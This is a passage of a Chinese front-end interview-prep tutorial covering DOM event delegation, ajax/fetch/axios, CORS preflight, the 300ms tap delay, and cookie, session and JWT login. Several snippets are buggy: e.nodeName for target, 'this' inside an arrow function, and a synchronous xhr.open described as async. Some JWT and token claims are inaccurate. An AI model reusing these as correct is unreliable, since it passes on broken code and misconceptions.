</code></pre></div><p>通用的事件绑定函数</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">bindEvent</span><span class="token punctuation">(</span><span class="token parameter">elem<span class="token punctuation">,</span> type<span class="token punctuation">,</span> fn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  elem<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> fn<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">const</span> a <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'link1'</span><span class="token punctuation">)</span>
<span class="token function">bindEvent</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 阻止默认行为</span>
  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'clicked'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><h2 id="事件冒泡"><a href="#事件冒泡" class="header-anchor">#</a> 事件冒泡</h2> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>div1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>p1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>激活<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>p2<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>取消<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>p3<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>取消<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>p4<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>取消<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>div2<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>p5<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>取消<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>p6<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>取消<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>对于以上 html 代码结构，点击<code>p1</code>时候进入激活状态，点击其他任何<code>p</code>都取消激活状态，如何实现？</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">const</span> p1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'p1'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> body <span class="token operator">=</span> document<span class="token punctuation">.</span>body
<span class="token function">bindEvent</span><span class="token punctuation">(</span>p1<span class="token punctuation">,</span> <span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  e<span class="token punctuation">.</span><span class="token function">stopPropagation</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 注释掉这一行，来体会事件冒泡</span>
  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'激活'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token function">bindEvent</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> <span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'取消'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>如果我们在<code>p1</code> <code>div1</code> <code>body</code>中都绑定了事件，它是会根据 DOM 的结构，来冒泡从下到上挨个执行的。但是我们使用<code>e.stopPropagation()</code>就可以阻止冒泡。</p> <h2 id="代理"><a href="#代理" class="header-anchor">#</a> 代理</h2> <p>我们设定一种场景，如下代码，一个<code>&lt;div&gt;</code>中包含了若干个<code>&lt;a&gt;</code>，而且还能继续增加。那如何快捷方便的为所有的<code>&lt;a&gt;</code>绑定事件呢？</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>div1<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>#<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>a1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>#<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>a2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>#<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>a3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>#<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>a4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">&gt;</span></span>点击增加一个 a 标签<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
</code></pre></div><p>这里就会用到事件代理，我们要监听<code>&lt;a&gt;</code>的事件，但要把具体的事件绑定到<code>&lt;div&gt;</code>上，然后看事件的触发点，是不是<code>&lt;a&gt;</code></p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">const</span> div1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'div1'</span><span class="token punctuation">)</span>
div1<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> target <span class="token operator">=</span> e<span class="token punctuation">.</span>target
  <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>nodeName <span class="token operator">===</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">alert</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>那我们现在完善一下之前写过的通用事件绑定函数，加上事件代理</p> <div class="language-javascript extra-class"><pre class="language-javascript"><code><span class="token keyword">function</span> <span class="token function">bindEvent</span><span class="token punctuation">(</span><span class="token parameter">elem<span class="token punctuation">,</span> type<span class="token punctuation">,</span> selector<span class="token punctuation">,</span> fn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>fn <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    fn <span class="token operator">=</span> selector
    selector <span class="token operator">=</span> <span class="token keyword">null</span>
  <span class="token punctuation">}</span>
  elem<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> target
    <span class="token keyword">if</span> <span class="token punctuation">(</span>selector<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      target <span class="token operator">=</span> e<span class="token punctuation">.</span>target
      <span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span>selector<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> e<span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token function">fn</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><p>然后这样使用</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 使用代理</span>
<span class="token keyword">const</span> div1 <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'div1'</span><span class="token punctuation">)</span>
<span class="token function">bindEvent</span><span class="token punctuation">(</span>div1<span class="token punctuation">,</span> <span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">// 不使用代理</span>
<span class="token keyword">const</span> a <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'a1'</span><span class="token punctuation">)</span>
<span class="token function">bindEvent</span><span class="token punctuation">(</span>div1<span class="token punctuation">,</span> <span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>innerHTML<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div><p>最后，使用代理的优点</p> <ul><li>使代码简洁</li> <li>减少浏览器的内存占用</li></ul> <h2 id="ajax-fetch-axios-的区别"><a href="#ajax-fetch-axios-的区别" class="header-anchor">#</a> ajax fetch axios 的区别</h2> <h3 id="分析"><a href="#分析" class="header-anchor">#</a> 分析</h3> <p>三者根本没有可比性，不要被题目搞混了。要说出他们的本质</p> <h3 id="传统-ajax"><a href="#传统-ajax" class="header-anchor">#</a> 传统 ajax</h3> <p>AJAX （几个单词首字母，按规范应该大写） - Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）<br>
即使用 JS 进行异步请求，是 Web2.0 的技术基础，从 2005 年左右开始发起。<br>
所以，这里的 AJAX 就是一个称呼，一个缩写。</p> <p>基于当时 JS 规范，异步请求主要使用 XMLHttpRequest 这个底层 API 。<br>
所以，有一道常考的面试题：请用 XMLHttpRequest 实现 ajax</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">ajax</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> successFn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span>
  xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 这里的函数异步执行，可参考之前 JS 基础中的异步模块</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">successFn</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>responseText<span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="fetch"><a href="#fetch" class="header-anchor">#</a> fetch</h3> <p>fetch 是一个原生 API ，它和 XMLHttpRequest 一个级别。</p> <p>fetch 和 XMLHttpRequest 的区别</p> <ul><li>写法更加简洁</li> <li>原生支持 promise</li></ul> <p>面试题：用 fetch 实现一个 ajax</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">ajax</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><h3 id="axios"><a href="#axios" class="header-anchor">#</a> axios</h3> <p>axios 是一个<a href="https://www.npmjs.com/package/axios" target="_blank" rel="noopener noreferrer">第三方库<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>，随着 Vue 一起崛起。它和 jquery 一样（jquery 也有 ajax 功能）。</p> <p>axios 内部可以用 XMLHttpRequest 或者 fetch 实现。</p> <h3 id="答案"><a href="#答案" class="header-anchor">#</a> 答案</h3> <ul><li>ajax 是一种技术称呼，不是具体的 API 和库</li> <li>fetch 是新的异步请求 API ，可代替 XMLHttpRequest</li> <li>axios 是第三方库</li></ul> <h2 id="htmlcollection-和-nodelist-的区别"><a href="#htmlcollection-和-nodelist-的区别" class="header-anchor">#</a> HTMLCollection 和 NodeList 的区别</h2> <h3 id="htmlcollection-和-nodelist"><a href="#htmlcollection-和-nodelist" class="header-anchor">#</a> HTMLCollection 和 NodeList</h3> <p>HTMLCollection 是 Element 集合，它由获取 Element 的 API 返回</p> <ul><li><code>elem.children</code></li> <li><code>document.getElementsByTagName('p')</code></li></ul> <p>NodeList 是 Node 集合，它由获取 Node 的 API 返回</p> <ul><li><code>document.querySelectorAll('p')</code></li> <li><code>elem.childNodes</code></li></ul> <h3 id="答案-2"><a href="#答案-2" class="header-anchor">#</a> 答案</h3> <ul><li>HTMLCollection 是 Element 集合，NodeList 是 Node 集合</li> <li>Node 是所有 DOM 节点的基类，Element 是 html 元素的基类</li></ul> <h3 id="划重点"><a href="#划重点" class="header-anchor">#</a> 划重点</h3> <p>注意 Node 和 Element 在实际 API 中的区别，如 <code>children</code> 和 <code>childNodes</code> 获取的结果可能是不一样的（如果子节点有 Text 或 Comment）</p> <h3 id="扩展-类数组"><a href="#扩展-类数组" class="header-anchor">#</a> 扩展：类数组</h3> <p>HTMLCollection 和 NodeList 都不是数组，而是“类数组”。转换为数组：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// HTMLCollection 和 NodeList 都不是数组，而是“类数组”</span>
<span class="token keyword">const</span> arr1 <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span>
<span class="token keyword">const</span> arr2 <span class="token operator">=</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span>
<span class="token keyword">const</span> arr3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>list<span class="token punctuation">]</span>
</code></pre></div><h2 id="options-请求"><a href="#options-请求" class="header-anchor">#</a> options 请求</h2> <p>使用 CORS 跨域请求时，经常会看到一个“多余”的 options 请求，之后才发送了实际的请求。</p> <p><img src="/assets/img/options.89034741.png" alt=""></p> <p>该请求就是为了检查服务端的 headers 信息，是否符合客户端的预期。所以它没有 body 的返回。</p> <blockquote><p>规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是 GET 以外的 HTTP 请求，或者搭配某些 MIME 类型的 POST 请求），浏览器必须首先使用 OPTIONS 方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨域请求。—— MDN</p></blockquote> <h3 id="答案-3"><a href="#答案-3" class="header-anchor">#</a> 答案</h3> <p>options 请求就是对 CORS 跨域请求之间的一次预检查，检查成功再发起正式请求，是浏览器自行处理的。<br>
了解即可，实际开发中不用过于关注。</p> <h2 id="移动端-click-300ms-延迟"><a href="#移动端-click-300ms-延迟" class="header-anchor">#</a> 移动端 click 300ms 延迟</h2> <h3 id="背景"><a href="#背景" class="header-anchor">#</a> 背景</h3> <p>智能手机开始流行的前期，浏览器可以点击缩放（double tap to zoom）网页。这样在手机上就可以浏览 PC 网页，很酷炫。</p> <p><img src="/assets/img/nytimes.5ee9f417.jpeg" alt=""></p> <p>浏览器为了分辨 click 还是“点击缩放”，就强行把 click 时间延迟 300ms 触发。</p> <h3 id="初期解决方案"><a href="#初期解决方案" class="header-anchor">#</a> 初期解决方案</h3> <p><a href="https://www.npmjs.com/package/fastclick" target="_blank" rel="noopener noreferrer">FastClick<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 专门用于解决这个问题。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// FastClick 使用非常简单</span>
window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span>
  <span class="token string">'load'</span><span class="token punctuation">,</span>
  <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    FastClick<span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>body<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token boolean">false</span>
<span class="token punctuation">)</span>
</code></pre></div><p>它的内部原理是</p> <ul><li>监听 <code>touchend</code> 事件 （<code>touchstart</code> <code>touchend</code> 会先于 <code>click</code> 事件被触发）</li> <li>通过 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/CustomEvent" target="_blank" rel="noopener noreferrer">DOM 自定义事件<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a> 模拟一个 click 事件</li> <li>把 300ms 之后触发的 click 事件阻止掉</li></ul> <h3 id="现代浏览器的改进"><a href="#现代浏览器的改进" class="header-anchor">#</a> 现代浏览器的改进</h3> <p>随着近几年移动端响应式的大力发展，移动端网页和 PC 网页有不同的设计，不用再缩放查看。<br>
这 300ms 的延迟就多余了，现代浏览器可以通过禁止缩放来取消这 300ms 的延迟。</p> <ul><li>Chrome 32+ on Android</li> <li>iOS 9.3</li></ul> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>viewport<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>width=device-width<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
</code></pre></div><h3 id="答案-4"><a href="#答案-4" class="header-anchor">#</a> 答案</h3> <ul><li>原因：点击缩放（double tap to zoom）网页</li> <li>可使用 FastClick 解决</li> <li>现代浏览器可使用 <code>width=device-width</code> 规避</li></ul> <h2 id="cookie-和-token-区别"><a href="#cookie-和-token-区别" class="header-anchor">#</a> cookie 和 token 区别</h2> <h3 id="cookie"><a href="#cookie" class="header-anchor">#</a> cookie</h3> <p>http 请求是无状态的，即每次请求之后都会断开链接。<br>
所以，每次请求时，都可以携带一段信息发送到服务端，以表明客户端的用户身份。服务端也也可以通过 <code>set-cookie</code> 向客户端设置 cookie 内容。<br>
由于每次请求都携带 cookie ，所以 cookie 大小限制 4kb 以内。</p> <p><img src="/assets/img/cookie.ab9a88f0.png" alt=""></p> <h3 id="cookie-作为本地存储"><a href="#cookie-作为本地存储" class="header-anchor">#</a> cookie 作为本地存储</h3> <p>前些年大家还常用 cookie 作为本地存储，这并不完全合适。<br>
所以后来 html5 增加了 <code>localStorage</code> 和 <code>sessionStorage</code> 作为本地存储。</p> <h3 id="cookie-跨域限制"><a href="#cookie-跨域限制" class="header-anchor">#</a> cookie 跨域限制</h3> <p>浏览器存储 cookie 是按照域名区分的，在浏览器无法通过 JS <code>document.cookie</code> 获取到其他域名的 cookie 。</p> <p>http 请求传递 cookie 默认有跨域限制。如果想要开启，需要客户端和服务器同时设置允许</p> <ul><li>客户端：使用 fetch 和 XMLHttpRequest 或者 axios 需要配置 <code>withCredentials</code></li> <li>服务端：需要配置 header <code>Access-Control-Allow-Credentials</code></li></ul> <h3 id="浏览器禁用第三发-cookie"><a href="#浏览器禁用第三发-cookie" class="header-anchor">#</a> 浏览器禁用第三发 cookie</h3> <p>现代浏览器都开始禁用第三方 cookie （第三方 js 设置 cookie），打击第三方广告，保护用户个人隐私。</p> <p>例如一个电商网站 A 引用了淘宝广告的 js</p> <ul><li>你访问 A 时，淘宝 js 设置 cookie ，记录下商品信息</li> <li>你再次访问淘宝时，淘宝即可获取这个 cookie 内容</li> <li>再和你的个人信息（也在 cookie 里）一起发送到服务端，这样就知道了你看了哪个商品</li></ul> <h3 id="cookie-和-session"><a href="#cookie-和-session" class="header-anchor">#</a> cookie 和 session</h3> <p>cookie 用途非常广泛，最常见的就是登录。</p> <p>使用 cookie 做登录校验</p> <ul><li>前端输入用户名密码，传给后端</li> <li>后端验证成功，返回信息时 set-cookie</li> <li>接下来所有接口访问，都自动带上 cookie （浏览器的默认行为， http 协议的规定）</li></ul> <p>什么是 session ？</p> <ul><li>cookie 只存储 userId ，不去暴露用户信息</li> <li>用户信息存储在 session 中 —— session 就是服务端的一个 hash 表</li></ul> <h3 id="token"><a href="#token" class="header-anchor">#</a> token</h3> <p>token 和 cookie 一样，也是一段用于客户端身份验证的字符串，随着 http 请求发送</p> <ul><li>cookie 是 http 协议规范的，而 token 是自定义的，可以用任何方式传输（如 header body query-string 等）</li> <li>token 默认不会在浏览器存储</li> <li>token 没有跨域限制</li></ul> <p>所以，token 很适合做跨域或者第三方的身份验证。</p> <h3 id="token-和-jwt"><a href="#token-和-jwt" class="header-anchor">#</a> token 和 JWT</h3> <p>JWT === JSON Web Token</p> <p>JWT 的过程</p> <ul><li>前端输入用户名密码，传给后端</li> <li>后端验证成功，返回一段 token 字符串 - 将用户信息加密之后得到的</li> <li>前端获取 token 之后，存储下来</li> <li>以后访问接口，都在 header 中带上这段 token</li></ul> <p><img src="/assets/img/token.947decd6.png" alt=""></p> <h3 id="答案-5"><a href="#答案-5" class="header-anchor">#</a> 答案</h3> <ul><li>cookie：http 规范；有跨域限制；可存储在本地；可配合 session 实现登录</li> <li>token：自定义标准；不在本地存储；无跨域限制；可用于 JWT 登录</li></ul> <h2 id="连环问-session-和-jwt-比较-你更推荐哪个"><a href="#连环问-session-和-jwt-比较-你更推荐哪个" class="header-anchor">#</a> 连环问：session 和 JWT 比较，你更推荐哪个？</h2> <p>Session 优点</p> <ul><li>原理简单，易于学习</li> <li>用户信息存储在服务端，可以快速封禁某个登录的用户 —— 有这方强需求的人，一定选择 Session</li></ul> <p>Session 的缺点</p> <ul><li>占用服务端内存，有硬件成本</li> <li>多进程、多服务器时，不好同步 —— 一般使用第三方 redis 存储 ，成本高</li> <li>跨域传递 cookie ，需要特殊配置</li></ul> <p>JWT 的优点</p> <ul><li>不占用服务器内存</li> <li>多进程、多服务器，不受影响</li> <li>不受跨域限制</li></ul> <p>JWT 的缺点</p> <ul><li>无法快速封禁登录的用户</li></ul> <p>总结：如果没有“快速封禁登录用户”的需求，建议使用 JWT 方式。</p> <h2 id="连环问-单点登录"><a href="#连环问-单点登录" class="header-anchor">#</a> 连环问：单点登录</h2> <h3 id="基于-cookie"><a href="#基于-cookie" 